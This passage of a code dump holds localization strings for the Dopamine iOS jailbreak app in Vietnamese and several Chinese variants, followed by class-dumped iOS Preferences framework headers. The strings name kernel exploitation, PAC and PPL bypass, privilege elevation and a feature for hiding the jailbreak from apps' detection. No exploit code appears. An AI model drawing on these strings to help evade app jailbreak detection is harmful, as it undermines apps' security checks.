"Hint_Hide_Jailbreak" = "Tùy chọn \"Ẩn Jailbreak\" sẽ tạm thời xóa các tệp liên quan đến jailbreak và khôi phục lại các tệp này khi bạn jailbreak vào lần tới.";
"Hint_Hide_Jailbreak_Jailbroken" = "Tùy chọn \"Ẩn Jailbreak\" sẽ tắt một số chức năng nhằm tránh phát hiện jailbreak trong các ứng dụng. Tuy nhiên, tính năng này không phải là hoàn hảo và không thể hoàn toàn ẩn jailbreak khỏi mọi ứng dụng.";
"Section_Jailbreak_Settings" = "Thiết đặt Jailbreak";
"Section_Actions" = "Tác vụ";
"Section_Customization" = "Tùy biến";
"Section_Exploits" = "Khai thác";
"Jetsam_Description" = "Jetsam là tính năng hệ thống nhằm dừng các tiến trình vượt ngưỡng bộ nhớ đã định. Khi có nhiều tweak được cài đặt, các tiến trình có thể vượt ngưỡng này ngay khi khởi động, gây ra tình trạng treo. Ở mục này, bạn có thể chọn một hệ số nhất định, số này sẽ được nhân với ngưỡng bộ nhớ riêng của từng tiến trình. Tăng hệ số nếu thiết bị gặp tình trạng văng/treo, hoặc xảy ra lỗi vặt khi có nhiều tweak được cài đặt. Để tránh ảnh hưởng đến hiệu năng, bạn nên chọn hệ số thấp nhất sao cho thiết bị vẫn chạy ổn định.";

// Settings Alerts
"Alert_Tweak_Injection_Toggled_Title" = "Khởi động lại Userspace";
"Alert_Tweak_Injection_Toggled_Body" = "Cần khởi động lại Userspace để áp dụng các thay đổi. Bạn muốn khởi động lại ngay bây giờ hay để sau?";
"Alert_Tweak_Injection_Toggled_Reboot_Now" = "Khởi động lại ngay";
"Alert_Tweak_Injection_Toggled_Reboot_Later" = "Để sau";
"Alert_Remove_Jailbreak_Title" = "Gỡ bỏ Jailbreak";
"Alert_Remove_Jailbreak_Pressed_Body" = "Việc này sẽ xóa toàn bộ các tệp liên quan đến jailbreak. Các ứng dụng, tệp và dữ liệu thông thường sẽ vẫn được giữ nguyên. Bạn sẽ không thể hoàn tác sau khi nhấn \"Tiếp tục\".";
"Alert_Remove_Jailbreak_Enabled_Body" = "Tùy chọn này sẽ xóa toàn bộ các tệp liên quan đến jailbreak khi bạn thực hiện jailbreak vào lần tới. Các ứng dụng, tệp và dữ liệu thông thường sẽ vẫn được giữ nguyên. Bạn sẽ không thể hoàn tác sau khi nhấn \"Tiếp tục\".";
"Alert_Change_Mobile_Password_Body" = "Thiết đặt mật khẩu của người dùng \"mobile\", có thể sử dụng để lấy quyền root thông qua sudo. Nếu muốn đặt mật khẩu root, bạn có thể thực hiện bằng lệnh \"sudo passwd root\" trong terminal.";
"Password_Placeholder" = "Nhập mật khẩu";
"Repeat_Password_Placeholder" = "Nhập lại mật khẩu";
"Password_Auth_Required" = "Bạn cần phải xác thực để đổi mật khẩu mobile.";
"Button_Change" = "Đổi";
"Button_Cancel" = "Hủy bỏ";
"Button_Continue" = "Tiếp tục";

// Duplicate Apps Errors
"Duplicate_Apps_Error_Dopamine_App" = "Có nhiều ứng dụng với cùng một tên định danh \"%@\" được cài đặt trong thư mục ứng dụng của Dopamine (\"%@\"). Không thể tiếp tục.";
"Duplicate_Apps_Error_User_App" = "Ứng dụng có tên định danh \"%@\" đã được cài đặt trong thư mục ứng dụng của Dopamine (\"%@\"), nhưng đồng thời cũng đã được cài đặt trên hệ thống. Không thể tiếp tục.";
"Duplicate_Apps_Error_Icon_Cache" = "Ứng dụng có tên định danh \"%@\" đã được cài đặt trong thư mục ứng dụng của Dopamine (\"%@\"), nhưng lại được ghi bên trong icon cache với một đường dẫn khác (\"%@\"). Không thể tiếp tục.";

// Settings Lists
"Theme" = "Chủ đề";
"Kernel Exploit" = "Lỗ hổng Kernel";
"PPL Bypass" = "Lỗ hổng PPL";
"PAC Bypass" = "Lỗ hổng PAC";
"None" = "Không có";
"Recommended" = "Đề xuất";

// Credits
"Credits_Button_Discord" = "Discord";
"Credits_Button_License" = "Giấy phép";
"Credits_Button_Source_Code" = "Mã nguồn";

// Logs
"Initializing Environment" = "Khởi tạo môi trường Jailbreak";
"Initializing Protection" = "Khởi tạo quy trình bảo vệ";
"Loading BaseBin TrustCache" = "Đang tải TrustCache BaseBin";
"Applying Bind Mount" = "Đang gắn Bind Mount";
"Removing Jailbreak" = "Đang gỡ bỏ Jailbreak";
"Elevating Privileges" = "Đang thực hiện nâng quyền";
"Cleaning Up Exploits" = "Đang dọn dẹp khai thác";
"Building Phys R/W Primitive" = "Đang dựng Phys R/W Primitive";
"Rebooting Userspace" = "Đang kh.động lại Userspace";
"Patchfinding" = "Đang chạy Patchfinding";
"Exploiting Kernel (%@)" = "Kh.thác lỗ hổng Kernel (%@)";
"Bypassing PAC (%@)" = "Kh.thác lỗ hổng PAC (%@)";
"Bypassing PPL (%@)" = "Kh.thác lỗ hổng PPL (%@)";

// Package Manager selection
"Status_Title_Select_Package_Managers" = "Chọn trình quản lý gói";
"Select_Package_Managers_Install_Message" = "Nếu bạn không biết nên nhấn vào lựa chọn nào, hãy chọn Sileo (sẽ không bao giờ có Cydia cho bạn chọn)";
"Continue" = "Tiếp tục";

```

`Application/Dopamine/zh-CN.lproj/Localizable.strings`:

```strings
"Credits_Made_By" = "作者：opa334, évelyne (ElleKit)";

// Log
"Status_Title_Jailbreaking" = "正在越狱";
"Log_Error" = "发生错误";

// Jailbreak Button
"Button_Jailbreak_Title" = "越狱";
"Status_Title_Jailbroken" = "已越狱";
"Unsupported" = "不支持";

// Action Menu
"Menu_Settings_Title" = "设置";
"Menu_Restart_SpringBoard_Title" = "重启 SpringBoard";
"Menu_Reboot_Userspace_Title" = "重启用户空间";
"Menu_Credits_Title" = "关于";

// Updating
"Button_Update" = "更新";
"Button_Update_Available" = "有更新可用";
"Button_Update_Environment" = "更新环境";

// Update View
"Update_Status_Downloading" = "正在下载更新...";
"Update_Status_Subtitle_Please_Wait" = "请等待文件下载完成";
"Update_Status_Installing" = "正在安装更新...";
"Update_Status_Subtitle_Restart_Soon" = "设备即将重启";
"Title_Changelog" = "更新日志";
"Changelog_Unavailable_Text" = "更新日志不可用";

// Removed Jailbreak Alert
"Removed_Jailbreak_Alert_Title" = "移除越狱";
"Removed_Jailbreak_Alert_Message" = "已成功移除越狱，建议重启设备。";
"Button_Close" = "关闭";

// Error View
"Button_Share" = "分享";
"Button_Reboot" = "重启";

// Settings Options
"Settings_Tweak_Injection" = "插件注入";
"Settings_iDownload" = "iDownload (开发者终端)";
"Settings_Verbose_Logs" = "详细日志";
"Settings_Apps_JIT" = "允许 App 使用 JIT";
"Settings_Jetsam_Multiplier" = "Jetsam 倍数";

// Settings Buttons
"Button_Remove_Jailbreak" = "移除越狱";
"Button_Hide_Jailbreak" = "隐藏越狱";
"Button_Unhide_Jailbreak" = "取消隐藏越狱";
"Button_Refresh_Jailbreak_Apps" = "刷新越狱 App";
"Button_Reinstall_Package_Managers" = "重新安装包管理器";
"Button_Change_Mobile_Password" = "修改 “mobile” 密码";

// Settings Hints
"Hint_Hide_Jailbreak" = "“隐藏越狱” 将在下次越狱前移除部分可能导致越狱检测的文件。";
"Hint_Hide_Jailbreak_Jailbroken" = "“隐藏越狱” 将禁用部分越狱功能以提升检测越狱的难度，不过这并不能完全防止应用检测到越狱。";
"Section_Jailbreak_Settings" = "越狱设置";
"Section_Actions" = "操作";
"Section_Customization" = "自定义";
"Section_Exploits" = "漏洞利用";
"Jetsam_Description" = "Jetsam 是一个系统守护进程，它会自动终止超过指定内存限制的进程。当安装了大量插件后，某些进程可能在启动时或启动后没多久内存使用超出限制，被 Jetsam 终止，导致进程循环崩溃。你可以选择一个倍数来扩大所有带内存限制进程的限制。如果你的系统在安装了大量插件之后出现频繁崩溃或者各种异常行为，请适当地增加这个倍数。但为了不对系统内存使用产生负面影响，建议选择能够使系统稳定运行的最低倍数。";

// Settings Alerts
"Alert_Tweak_Injection_Toggled_Title" = "需要重启用户空间";
"Alert_Tweak_Injection_Toggled_Body" = "需要重启用户空间才能应用更改，是否现在重启？";
"Alert_Tweak_Injection_Toggled_Reboot_Now" = "立即重启";
"Alert_Tweak_Injection_Toggled_Reboot_Later" = "稍后重启";
"Alert_Remove_Jailbreak_Title" = "移除越狱";
"Alert_Remove_Jailbreak_Pressed_Body" = "“移除越狱” 将移除所有和越狱相关的文件，而常规的 App、文档及数据不会受到任何影响。请注意，此操作无法撤销。确认要移除越狱吗？";
"Alert_Remove_Jailbreak_Enabled_Body" = "“移除越狱” 将在下次越狱时移除所有和越狱相关的文件，而常规的 App、文档及数据不会受到任何影响。请注意，此操作无法撤销。确认要移除越狱吗？";
"Alert_Change_Mobile_Password_Body" = "这将会在你的设备上修改 “mobile” 密码，此密码可用于使用 sudo 命令。如需设置 “root” 密码，请在 shell 中使用命令 “sudo passwd root”。";
"Password_Placeholder" = "密码";
"Repeat_Password_Placeholder" = "重复密码";
/*Password_Auth_Required*/
"Button_Change" = "修改";
"Button_Cancel" = "取消";
"Button_Continue" = "继续";

// Duplicate Apps Errors
"Duplicate_Apps_Error_Dopamine_App" = "检测到多个标识符为 \"%@\" 的 App 在 Dopamine 的 App 目录中 (\"%@\")，无法继续。";
"Duplicate_Apps_Error_User_App" = "检测到标识符为 \"%@\" 的 App 存在 Dopamine 的 App 目录中 (\"%@\") ，但其已被单独安装在系统上，无法继续。";
"Duplicate_Apps_Error_Icon_Cache" = "检测到标识符为 \"%@\" 的 App 存在于 Dopamine 的 App 目录中 (\"%@\")，但其已在不同路径 (\"%@\") 下注册了图标缓存，无法继续。";

// Settings Lists
"Theme" = "主题";
"Kernel Exploit" = "内核漏洞";
"PPL Bypass" = "PPL 绕过";
"PAC Bypass" = "PAC 绕过";
"None" = "无";
"Recommended" = "推荐";

// Credits
"Credits_Button_Discord" = "Discord";
"Credits_Button_License" = "许可证";
"Credits_Button_Source_Code" = "源代码";

// Logs
"Initializing Environment" = "初始化环境";
"Initializing Protection" = "初始化保护";
"Loading BaseBin TrustCache" = "将基础套件加载至信任缓存（TrustCache）";
"Applying Bind Mount" = "应用绑定挂载";
"Removing Jailbreak" = "移除越狱";
"Elevating Privileges" = "提升权限";
"Cleaning Up Exploits" = "清理环境";
"Building Phys R/W Primitive" = "构建硬件读写条件";
"Rebooting Userspace" = "重启用户空间";
"Patchfinding" = "查找地址";
"Exploiting Kernel (%@)" = "正在利用内核 (%@)";
"Bypassing PAC (%@)" = "正在绕过 PAC (%@)";
"Bypassing PPL (%@)" = "正在绕过 PPL (%@)";

// Package Manager selection
"Status_Title_Select_Package_Managers" = "请选择包管理器";
"Select_Package_Managers_Install_Message" = "如果你不确定选择哪一个比较好，请选择 Sileo";
"Continue" = "继续";

```

`Application/Dopamine/zh-HK.lproj/Localizable.strings`:

```strings
"Credits_Made_By" = "作者：opa334, évelyne";

// Log
"Status_Title_Jailbreaking" = "正在越獄";
"Log_Error" = "失敗";

// Jailbreak Button
"Button_Jailbreak_Title" = "越獄";
"Status_Title_Jailbroken" = "已越獄";
/*Unsupported*/

// Action Menu
"Menu_Settings_Title" = "設置";
"Menu_Restart_SpringBoard_Title" = "註銷";
"Menu_Reboot_Userspace_Title" = "用戶空間重啟";
"Menu_Credits_Title" = "關於";

// Updating
"Button_Update" = "更新";
"Button_Update_Available" = "可更新";
"Button_Update_Environment" = "更新環境";

// Update View
"Update_Status_Downloading" = "正在下載更新…";
"Update_Status_Subtitle_Please_Wait" = "請等待完成下載";
"Update_Status_Installing" = "正在安裝更新…";
"Update_Status_Subtitle_Restart_Soon" = "裝置即將重新啟動";
"Title_Changelog" = "變更日誌";
"Changelog_Unavailable_Text" = "變更日誌不可用";

// Removed Jailbreak Alert
/*Removed_Jailbreak_Alert_Title*/
/*Removed_Jailbreak_Alert_Message*/
/*Button_Close*/

// Error View
/*Button_Share*/
/*Button_Reboot*/

// Settings Toggles
"Settings_Tweak_Injection" = "插件注入";
"Settings_iDownload" = "iDownload (开发商终端)";
"Settings_Verbose_Logs" = "詳細日誌";
/*Settings_Apps_JIT*/

// Settings Buttons
"Button_Remove_Jailbreak" = "清除越獄";
"Button_Hide_Jailbreak" = "隱藏越獄";
"Button_Unhide_Jailbreak" = "解除隱藏越獄";
/*Button_Refresh_Jailbreak_Apps*/
"Button_Reinstall_Package_Managers" = "重新安裝包管理器（越獄商店）";
/*Button_Change_Mobile_Password*/

// Settings Hints
"Hint_Hide_Jailbreak" = "「隱藏越獄」將在下次越獄前臨時移除越獄相關的文件";
"Hint_Hide_Jailbreak_Jailbroken" = "已越獄時，「隱藏越獄」將部分禁用越獄功能以增加探測越獄的難度。但是，這並非總是有效，也沒有隱藏所有東西。";
/*Section_Jailbreak_Settings*/
/*Section_Actions*/
/*Section_Customization*/
/*Section_Exploits*/

// Settings Alerts
/*Alert_Tweak_Injection_Toggled_Title*/
"Alert_Tweak_Injection_Toggled_Body" = "為使變更生效需用戶空間重啟，即可執行否？";
/*Alert_Tweak_Injection_Toggled_Reboot_Now*/
/*Alert_Tweak_Injection_Toggled_Reboot_Later*/
"Alert_Remove_Jailbreak_Title" = "清除越獄";
"Alert_Remove_Jailbreak_Pressed_Body" = "清除越獄將移除所有和越獄相關的文件，但將保留普通 App、文件、數據。請注意，此操作無法撤銷。確認清除越獄嗎？";
/*Alert_Remove_Jailbreak_Enabled_Body*/
/*Alert_Change_Mobile_Password_Body*/
/*Password_Placeholder*/
/*Repeat_Password_Placeholder*/
/*Password_Auth_Required*/
/*Button_Change*/
"Button_Cancel" = "取消";
/*Button_Continue*/

// Duplicate Apps Errors
/*Duplicate_Apps_Error_Dopamine_App*/
/*Duplicate_Apps_Error_User_App*/
/*Duplicate_Apps_Error_Icon_Cache*/

// Settings Lists
/*Theme*/
/*Kernel Exploit*/
/*PPL Bypass*/
/*PAC Bypass*/
/*None*/
/*Recommended*/

// Credits
"Credits_Button_Discord" = "Discord";
"Credits_Button_License" = "許可證";
"Credits_Button_Source_Code" = "原始碼";

// Logs
"Initializing Environment" = "初始化環境";
/*Initializing Protection*/
/*Loading BaseBin TrustCache*/
/*Applying Bind Mount*/
/*Removing Jailbreak*/
/*Elevating Privileges*/
/*Cleaning Up Exploits*/
/*Building Phys R/W Primitive*/
/*Rebooting Userspace*/
"Patchfinding" = "Patchfinding";
/*Exploiting Kernel (%@)*/
/*Bypassing PAC (%@)*/
/*Bypassing PPL (%@)*/

// Package Manager selection
"Status_Title_Select_Package_Managers" = "選定包管理器（越獄商店）";
"Select_Package_Managers_Install_Message" = "若不確定如何選擇，請使用 Sileo";
"Continue" = "繼續";


```

`Application/Dopamine/zh-Hans.lproj/Localizable.strings`:

```strings
"Credits_Made_By" = "作者：opa334, évelyne (ElleKit)";

// Log
"Status_Title_Jailbreaking" = "正在越狱";
"Log_Error" = "发生错误";

// Jailbreak Button
"Button_Jailbreak_Title" = "越狱";
"Status_Title_Jailbroken" = "已越狱";
"Unsupported" = "不支持";

// Action Menu
"Menu_Settings_Title" = "设置";
"Menu_Restart_SpringBoard_Title" = "重启 SpringBoard";
"Menu_Reboot_Userspace_Title" = "重启用户空间";
"Menu_Credits_Title" = "关于";

// Updating
"Button_Update" = "更新";
"Button_Update_Available" = "有更新可用";
"Button_Update_Environment" = "更新环境";

// Update View
"Update_Status_Downloading" = "正在下载更新...";
"Update_Status_Subtitle_Please_Wait" = "请等待文件下载完成";
"Update_Status_Installing" = "正在安装更新...";
"Update_Status_Subtitle_Restart_Soon" = "设备即将重启";
"Title_Changelog" = "更新日志";
"Changelog_Unavailable_Text" = "更新日志不可用";

// Removed Jailbreak Alert
"Removed_Jailbreak_Alert_Title" = "移除越狱";
"Removed_Jailbreak_Alert_Message" = "已成功移除越狱，建议重启设备。";
"Button_Close" = "关闭";

// Error View
"Button_Share" = "分享";
"Button_Reboot" = "重启";

// Settings Options
"Settings_Tweak_Injection" = "插件注入";
"Settings_iDownload" = "iDownload (开发者终端)";
"Settings_Verbose_Logs" = "详细日志";
"Settings_Apps_JIT" = "允许 App 使用 JIT";
"Settings_Jetsam_Multiplier" = "Jetsam 倍数";

// Settings Buttons
"Button_Remove_Jailbreak" = "移除越狱";
"Button_Hide_Jailbreak" = "隐藏越狱";
"Button_Unhide_Jailbreak" = "取消隐藏越狱";
"Button_Refresh_Jailbreak_Apps" = "刷新越狱 App";
"Button_Reinstall_Package_Managers" = "重新安装包管理器";
"Button_Change_Mobile_Password" = "修改 “mobile” 密码";

// Settings Hints
"Hint_Hide_Jailbreak" = "“隐藏越狱” 将在下次越狱前移除部分可能导致越狱检测的文件。";
"Hint_Hide_Jailbreak_Jailbroken" = "“隐藏越狱” 将禁用部分越狱功能以提升检测越狱的难度，不过这并不能完全防止应用检测到越狱。";
"Section_Jailbreak_Settings" = "越狱设置";
"Section_Actions" = "操作";
"Section_Customization" = "自定义";
"Section_Exploits" = "漏洞利用";
"Jetsam_Description" = "Jetsam 是一个系统守护进程，它会自动终止超过指定内存限制的进程。当安装了大量插件后，某些进程可能在启动时或启动后没多久内存使用超出限制，被 Jetsam 终止，导致进程循环崩溃。你可以选择一个倍数来扩大所有带内存限制进程的限制。如果你的系统在安装了大量插件之后出现频繁崩溃或者各种异常行为，请适当地增加这个倍数。但为了不对系统内存使用产生负面影响，建议选择能够使系统稳定运行的最低倍数。";

// Settings Alerts
"Alert_Tweak_Injection_Toggled_Title" = "需要重启用户空间";
"Alert_Tweak_Injection_Toggled_Body" = "需要重启用户空间才能应用更改，是否现在重启？";
"Alert_Tweak_Injection_Toggled_Reboot_Now" = "立即重启";
"Alert_Tweak_Injection_Toggled_Reboot_Later" = "稍后重启";
"Alert_Remove_Jailbreak_Title" = "移除越狱";
"Alert_Remove_Jailbreak_Pressed_Body" = "“移除越狱” 将移除所有和越狱相关的文件，而常规的 App、文档及数据不会受到任何影响。请注意，此操作无法撤销。确认要移除越狱吗？";
"Alert_Remove_Jailbreak_Enabled_Body" = "“移除越狱” 将在下次越狱时移除所有和越狱相关的文件，而常规的 App、文档及数据不会受到任何影响。请注意，此操作无法撤销。确认要移除越狱吗？";
"Alert_Change_Mobile_Password_Body" = "这将会在你的设备上修改 “mobile” 密码，此密码可用于使用 sudo 命令。如需设置 “root” 密码，请在 shell 中使用命令 “sudo passwd root”。";
"Password_Placeholder" = "密码";
"Repeat_Password_Placeholder" = "重复密码";
/*Password_Auth_Required*/
"Button_Change" = "修改";
"Button_Cancel" = "取消";
"Button_Continue" = "继续";

// Duplicate Apps Errors
"Duplicate_Apps_Error_Dopamine_App" = "检测到多个标识符为 \"%@\" 的 App 在 Dopamine 的 App 目录中 (\"%@\")，无法继续。";
"Duplicate_Apps_Error_User_App" = "检测到标识符为 \"%@\" 的 App 存在 Dopamine 的 App 目录中 (\"%@\") ，但其已被单独安装在系统上，无法继续。";
"Duplicate_Apps_Error_Icon_Cache" = "检测到标识符为 \"%@\" 的 App 存在于 Dopamine 的 App 目录中 (\"%@\")，但其已在不同路径 (\"%@\") 下注册了图标缓存，无法继续。";

// Settings Lists
"Theme" = "主题";
"Kernel Exploit" = "内核漏洞";
"PPL Bypass" = "PPL 绕过";
"PAC Bypass" = "PAC 绕过";
"None" = "无";
"Recommended" = "推荐";

// Credits
"Credits_Button_Discord" = "Discord";
"Credits_Button_License" = "许可证";
"Credits_Button_Source_Code" = "源代码";

// Logs
"Initializing Environment" = "初始化环境";
"Initializing Protection" = "初始化保护";
"Loading BaseBin TrustCache" = "将基础套件加载至信任缓存（TrustCache）";
"Applying Bind Mount" = "应用绑定挂载";
"Removing Jailbreak" = "移除越狱";
"Elevating Privileges" = "提升权限";
"Cleaning Up Exploits" = "清理环境";
"Building Phys R/W Primitive" = "构建硬件读写条件";
"Rebooting Userspace" = "重启用户空间";
"Patchfinding" = "查找地址";
"Exploiting Kernel (%@)" = "正在利用内核 (%@)";
"Bypassing PAC (%@)" = "正在绕过 PAC (%@)";
"Bypassing PPL (%@)" = "正在绕过 PPL (%@)";

// Package Manager selection
"Status_Title_Select_Package_Managers" = "请选择包管理器";
"Select_Package_Managers_Install_Message" = "如果你不确定选择哪一个比较好，请选择 Sileo";
"Continue" = "继续";

```

`Application/Dopamine/zh-TW.lproj/Localizable.strings`:

```strings
"Credits_Made_By" = "由opa334開發，ElleKit 由 évelyne 開發";

// Log
"Status_Title_Jailbreaking" = "正在越獄";
"Log_Error" = "錯誤";

// Jailbreak Button
"Button_Jailbreak_Title" = "越獄";
"Status_Title_Jailbroken" = "已越獄";
"Unsupported" = "不支援";

// Action Menu
"Menu_Settings_Title" = "設定";
"Menu_Restart_SpringBoard_Title" = "重新啟動主畫面";
"Menu_Reboot_Userspace_Title" = "重新啟動使用者空間";
"Menu_Credits_Title" = "致謝";

// Updating
"Button_Update" = "更新";
"Button_Update_Available" = "可用更新";
"Button_Update_Environment" = "環境更新";

// Update View
"Update_Status_Downloading" = "正在下載更新……";
"Update_Status_Subtitle_Please_Wait" = "請等待檔案下載完畢";
"Update_Status_Installing" = "正在安裝更新……";
"Update_Status_Subtitle_Restart_Soon" = "裝置即將重新啟動";
"Title_Changelog" = "版本日誌";
"Changelog_Unavailable_Text" = "無法存取版本日誌";

// Removed Jailbreak Alert
"Removed_Jailbreak_Alert_Title" = "移除越獄";
"Removed_Jailbreak_Alert_Message" = "移除越獄成功。 建議將設備重開機。";
"Button_Close" = "關閉";

// Error View
"Button_Share" = "分享";
"Button_Reboot" = "重新開機";

// Settings Toggles
"Settings_Tweak_Injection" = "載入外掛";
"Settings_iDownload" = "iDownload（開發者終端）";
"Settings_Verbose_Logs" = "詳細日誌";
"Settings_Apps_JIT" = "於應用程式中啟用 JIT";

// Settings Buttons
"Button_Remove_Jailbreak" = "移除越獄";
"Button_Hide_Jailbreak" = "隱藏越獄";
"Button_Unhide_Jailbreak" = "顯示越獄";
"Button_Refresh_Jailbreak_Apps" = "重新整理越獄應用程式";
"Button_Reinstall_Package_Managers" = "重新安裝套件管理器";
"Button_Change_Mobile_Password" = "更改「mobile」密碼";

// Settings Hints
"Hint_Hide_Jailbreak" = "\"隱藏越獄\"將在下次越獄時暫時移除越獄檔案";
"Hint_Hide_Jailbreak_Jailbroken" = "在越獄狀態下，\"隱藏越獄\" 選項會停用部分越獄功能來躲避越獄偵測。但不保證一定能成功躲避偵測。";
"Section_Jailbreak_Settings" = "越獄設定";
"Section_Actions" = "動作";
"Section_Customization" = "客製化";
"Section_Exploits" = "選擇漏洞";

// Settings Alerts
"Alert_Tweak_Injection_Toggled_Title" = "需要重新啟動使用者空間";
"Alert_Tweak_Injection_Toggled_Body" = "必需重新啟動使用者空間才能套用更變。 要現在進行嗎?";
"Alert_Tweak_Injection_Toggled_Reboot_Now" = "現在重新啟動";
"Alert_Tweak_Injection_Toggled_Reboot_Later" = "稍後重新啟動";
"Alert_Remove_Jailbreak_Title" = "移除越獄";
"Alert_Remove_Jailbreak_Pressed_Body" =
"移除越獄將移除所有和越獄相關的檔案，但將保留非越獄相關應用程式、檔案，與資料。請注意，移除的檔案無法復原。是否移除越獄？";
"Alert_Remove_Jailbreak_Enabled_Body" =
"啟用「移除越獄」將於下次越獄刪除所有與越獄相關的所有檔案，不過所有其他非越獄相關應用程式、檔案，與資料將被保留。移除的檔案無法復原，是否移除越獄？";
"Alert_Change_Mobile_Password_Body" = "於此裝置中設定「mobile」使用者的密碼。此密碼亦可與 sudo
搭配取得根權限。若您想設定「root」使用者密碼可於 mobile 終端中輸入「sudo passwd root」";
"Password_Placeholder" = "密碼";
"Repeat_Password_Placeholder" = "重複密碼";
"Password_Auth_Required" = "在更改密碼前需要授權。";
"Button_Change" = "更改";
"Button_Cancel" = "取消";
"Button_Continue" = "繼續";

// Duplicate Apps Errors
"Duplicate_Apps_Error_Dopamine_App" = "Dopamines 應用程式目錄 (\"%@\") 內有多個識別碼為 \"%@\" 的應用程式。無法繼續。";
"Duplicate_Apps_Error_User_App" = "標識碼為 %@ 的應用程式存在於 Dopamines 應用程式目錄 (\"%@\") 中，但也單獨安裝在系統上。無法繼續。";
"Duplicate_Apps_Error_Icon_Cache" = "標識碼為 \"%@\" 的應用程式存在於 Dopamine 應用程式目錄 (\"%@\") 中，但也在不同路徑 (\"%@\") 下的圖示快取中註冊。無法繼續。";

// Settings Lists
"Theme" = "主題";
"Kernel Exploit" = "核心漏洞";
"PPL Bypass" = "繞過 PPL";
"PAC Bypass" = "繞過 PAC";
"None" = "無";
"Recommended" = "建議";

// Credits
"Credits_Button_Discord" = "Discord";
"Credits_Button_License" = "授權條款";
"Credits_Button_Source_Code" = "原始碼";

// Logs
"Initializing Environment" = "正在初始化環境";
"Initializing Protection" = "正在初始話保護";
"Loading BaseBin TrustCache" = "正在載入 BaseBin TrustCache";
"Applying Bind Mount" = "正在套用 Bind Mount";
"Removing Jailbreak" = "正在移除越獄";
"Elevating Privileges" = "正在提升權限";
"Cleaning Up Exploits" = "正在為利用漏洞善後";
"Building Phys R/W Primitive" = "正在建立 Phys R/W Primitive";
"Rebooting Userspace" = "正在重新啟動使用者空間";
"Patchfinding" = "正在尋找修正檔";
"Exploiting Kernel (%@)" = "正在利用核心漏洞 (%@)";
"Bypassing PAC (%@)" = "正在繞過 PAC 防護 (%@)";
"Bypassing PPL (%@)" = "正在繞過 PPL 防護 (%@)";

// Package Manager selection
"Status_Title_Select_Package_Managers" = "選擇套件管理器";
"Select_Package_Managers_Install_Message" = "請於不確定時選擇 Sileo";
"Continue" = "繼續";

```

`Application/Frameworks/Preferences.framework/Headers/PSControlTableCell.h`:

```h
/*
 * This header is generated by classdump-dyld 0.7
 * on Friday, November 7, 2014 at 1:48:08 AM Eastern European Standard Time
 * Operating System: Version 8.1 (Build 12B411)
 * Image Source: /System/Library/PrivateFrameworks/Preferences.framework/Preferences
 * classdump-dyld is licensed under GPLv3, Copyright Â© 2013 by Elias Limneos.
 */

#import <Preferences/PSTableCell.h>

@class UIControl;

@interface PSControlTableCell : PSTableCell {
    
    UIControl* _control;
    
}

@property (nonatomic,retain) UIControl * control;
-(void)dealloc;
-(BOOL)canReload;
-(id)initWithStyle:(long long)arg1 reuseIdentifier:(id)arg2 specifier:(id)arg3 ;
-(void)refreshCellContentsWithSpecifier:(id)arg1 ;
-(id)newControl;
-(void)controlChanged:(id)arg1 ;
-(id)controlValue;
-(id)valueLabel;
-(void)setControl:(UIControl *)arg1 ;
-(UIControl *)control;
@end

```

`Application/Frameworks/Preferences.framework/Headers/PSListController.h`:

```h

#import "PSViewController.h"

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>

@class NSArray, NSMutableArray, NSMutableDictionary, NSString, UIActionSheet, UIAlertView, UIKeyboard, UIPopoverController, UITableView, UIView;

@interface PSListController : PSViewController <UITableViewDelegate, UITableViewDataSource, UIActionSheetDelegate, UIAlertViewDelegate, UIPopoverControllerDelegate/*, PSViewControllerOffsetProtocol*/> {
    
    /*
     struct CGPoint {
     float x;
     float y;
     UIActionSheet *_actionSheet;
     UIAlertView *_alertView;
     NSMutableArray *_bundleControllers;
     BOOL _bundlesLoaded;
     BOOL _cachesCells;
     NSMutableDictionary *_cells;
     UIView *_containerView;
     } _contentOffsetWithKeyboard;
     */
    
    BOOL _edgeToEdgeCells;
    BOOL _forceSynchronousIconLoadForCreatedCells;
    NSMutableArray *_groups;
    BOOL _hasAppeared;
    //UIKeyboard *_keyboard;
    BOOL _keyboardWasVisible;
    NSString *_offsetItemName;
    BOOL _popupIsDismissing;
    BOOL _popupIsModal;
    UIPopoverController *_popupStylePopoverController;
    BOOL _popupStylePopoverShouldRePresent;
    NSMutableArray *_prequeuedReusablePSTableCells;
    BOOL _reusesCells;
    BOOL _showingSetupController;
    NSString *_specifierID;
    NSArray *_specifiers;
    NSMutableDictionary *_specifiersByID;
    BOOL _swapAlertButtons;
    UITableView *_table;
    float _verticalContentOffset;
}

@property BOOL edgeToEdgeCells;
@property BOOL forceSynchronousIconLoadForCreatedCells;

+ (BOOL)displaysButtonBar;

- (void)_addIdentifierForSpecifier:(id)arg1;
- (id)_createGroupIndices:(id)arg1;
- (id)_customViewForSpecifier:(id)arg1 class:(Class)arg2 isHeader:(BOOL)arg3;
- (BOOL)_getGroup:(int*)arg1 row:(int*)arg2 ofSpecifierAtIndex:(int)arg3 groups:(id)arg4;
- (float)_getKeyboardIntersectionHeight;
- (void)_handleActionSheet:(id)arg1 clickedButtonAtIndex:(int)arg2;
- (void)_insertContiguousSpecifiers:(id)arg1 atIndex:(int)arg2 animated:(BOOL)arg3;
- (void)_keyboardDidHide:(id)arg1;
- (void)_keyboardWillHide:(id)arg1;
- (void)_keyboardWillShow:(id)arg1;
- (void)_loadBundleControllers;
- (int)_nextGroupInSpecifiersAfterIndex:(int)arg1 inArray:(id)arg2;
- (void)_removeContiguousSpecifiers:(id)arg1 animated:(BOOL)arg2;
- (void)_removeIdentifierForSpecifier:(id)arg1;
- (void)_returnKeyPressed:(id)arg1;
- (void)_scrollToSpecifierNamed:(id)arg1;
- (void)_setContentInset:(float)arg1;
- (void)_setNotShowingSetupController;
- (float)_tableView:(id)arg1 heightForCustomInSection:(int)arg2 isHeader:(BOOL)arg3;
- (id)_tableView:(id)arg1 viewForCustomInSection:(int)arg2 isHeader:(BOOL)arg3;
- (void)_unloadBundleControllers;
- (void)actionSheet:(id)arg1 clickedButtonAtIndex:(NSInteger)arg2;
- (void)actionSheet:(id)arg1 didDismissWithButtonIndex:(NSInteger)arg2;
- (void)addSpecifier:(id)arg1 animated:(BOOL)arg2;
- (void)addSpecifier:(id)arg1;
- (void)addSpecifiersFromArray:(id)arg1 animated:(BOOL)arg2;
- (void)addSpecifiersFromArray:(id)arg1;
- (void)alertView:(id)arg1 clickedButtonAtIndex:(NSInteger)arg2;
- (void)beginUpdates;
- (id)bundle;
- (id)cachedCellForSpecifier:(id)arg1;
- (id)cachedCellForSpecifierID:(id)arg1;
- (void)clearCache;
